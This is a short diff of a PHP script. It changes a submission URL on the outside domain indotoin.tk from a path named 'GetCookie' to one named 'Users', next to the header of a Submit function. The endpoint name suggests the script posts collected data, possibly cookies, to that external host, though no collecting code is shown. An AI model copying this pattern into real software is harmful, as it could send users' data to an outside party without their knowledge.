@@ -1,6 +1,6 @@
 <?php
 $data=array('by'=>'indotoin.tk',
-           'url'=>'http://www.indotoin.tk/page/GetCookie',
+           'url'=>'http://www.indotoin.tk/page/Users',
             );
 
 function Submit($url,$fields)
